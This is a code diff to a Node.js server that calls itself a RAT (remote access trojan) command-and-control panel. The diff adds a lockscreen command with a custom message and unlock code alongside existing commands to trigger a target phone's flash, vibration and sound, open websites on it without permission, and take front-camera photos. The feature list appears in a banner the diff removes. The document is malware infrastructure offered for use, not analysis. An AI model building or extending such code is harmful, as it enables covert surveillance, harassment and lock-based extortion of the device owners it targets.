@@ -119,7 +119,7 @@ app.get('/api/devices', authenticateToken, (req, res) => {
     res.json(deviceList);
 });
 
-// Send command
+// Send lockscreen command
 app.post('/api/device/:deviceId/command', authenticateToken, (req, res) => {
     const deviceId = req.params.deviceId;
     const { command, params } = req.body;
@@ -160,7 +160,9 @@ app.post('/api/device/:deviceId/command', authenticateToken, (req, res) => {
     } else if (command === 'sound') {
         console.log(`🎵 [SOUND] PLAYING -> ${deviceName} (${deviceId}) | DURATION: ${params?.duration || 3}s`);
     } else if (command === 'website') {
-        console.log(`🌐 [WEBSITE] OPENING -> ${deviceName} (${deviceId}) | URL: ${params?.url || 'https://'}`);
+        console.log(`🌐 [WEBSITE] OPENING -> ${deviceName} (${deviceId}) | URL: ${params?.url || 'google.com'}`);
+    } else if (command === 'lockscreen') {
+        console.log(`🔒 [LOCKSCREEN] SENDING -> ${deviceName} (${deviceId}) | MSG: ${params?.message || 'LOCKED'} | CODE: ${params?.code || '1234'}`);
     }
     
     res.json({ success: true, commandId, message: 'Command sent' });
@@ -239,6 +241,12 @@ app.post('/api/device/command/result', (req, res) => {
                 console.log(`✅ [WEBSITE] SUCCESS -> ${deviceName} | URL: ${result?.url}`);
             } else {
                 console.log(`❌ [WEBSITE] FAILED -> ${deviceName}`);
+            }
+        } else if (deviceCommands[commandIndex].command === 'lockscreen') {
+            if (status === 'completed') {
+                console.log(`✅ [LOCKSCREEN] SUCCESS -> ${deviceName} | LOCK ACTIVE`);
+            } else {
+                console.log(`❌ [LOCKSCREEN] FAILED -> ${deviceName}`);
             }
         }
     }
@@ -432,43 +440,11 @@ const PORT = process.env.PORT || 3000;
 server.listen(PORT, () => {
     console.log(`
 ╔══════════════════════════════════════════════════════════════╗
-║              QUANTUMX RAT SERVER v8.0 - FINAL                ║
+║              QUANTUMX RAT SERVER v7.0 - FINAL                ║
 ╠══════════════════════════════════════════════════════════════╣
 ║  RUNNING ON PORT: ${PORT}                                                ║
 ║  WEBSOCKET: ws://localhost:${PORT}                                       ║
 ║  API: http://localhost:${PORT}/api                                      ║
 ╠══════════════════════════════════════════════════════════════╣
-║                      FITUR TERSEDIA                            ║
-╠══════════════════════════════════════════════════════════════╣
-║  📸 FLASH      - Kontrol LED flash                           ║
-║  📳 VIBRATE    - Getar perangkat                             ║
-║  🔆 BRIGHTNESS - Atur kecerahan layar                        ║
-║  🔊 VOLUME     - Atur volume media                           ║
-║  🎵 SOUND      - Putar suara MP3 di target (dengan durasi)   ║
-║  📏 FONT SIZE  - Atur ukuran font sistem                     ║
-║  🌐 WEBSITE    - Buka website di target (tanpa izin)         ║
-║  📷 CAMERA     - Ambil foto kamera depan                     ║
-╠══════════════════════════════════════════════════════════════╣
-║                      LOG FORMAT                                ║
-╠══════════════════════════════════════════════════════════════╣
-║  📸 [FLASH] SENDING -> Device (2s)                           ║
-║  ✅ [FLASH] SUCCESS -> Device | DURATION: 2s                 ║
-║  📳 [VIBRATE] SENDING -> Device (2s)                         ║
-║  ✅ [VIBRATE] SUCCESS -> Device | DURATION: 2s               ║
-║  🔆 [BRIGHTNESS] SETTING -> Device | LEVEL: 75%              ║
-║  ✅ [BRIGHTNESS] SUCCESS -> Device | LEVEL: 75%              ║
-║  🔊 [VOLUME] SETTING -> Device | LEVEL: 50% | TYPE: music    ║
-║  ✅ [VOLUME] SUCCESS -> Device | LEVEL: 50% | TYPE: music    ║
-║  🎵 [SOUND] PLAYING -> Device | DURATION: 5s                 ║
-║  ✅ [SOUND] SUCCESS -> Device | DURATION: 5s                 ║
-║  📏 [FONT SIZE] SETTING -> Device | SCALE: 100%              ║
-║  ✅ [FONT SIZE] SUCCESS -> Device | SCALE: 100%              ║
-║  🌐 [WEBSITE] OPENING -> Device | URL: https://example.com    ║
-║  ✅ [WEBSITE] SUCCESS -> Device | URL: https://example.com    ║
-║  📷 [CAMERA] CAPTURING -> Device                              ║
-║  ✅ [CAMERA] SUCCESS -> Device | PHOTO TAKEN                  ║
-║  📱 [DEVICE] ONLINE -> Device | NETWORK: WiFi SSID            ║
-║  💓 [HEARTBEAT] Device - 82% - NETWORK: 4G                    ║
-╚══════════════════════════════════════════════════════════════╝
     `);
 });
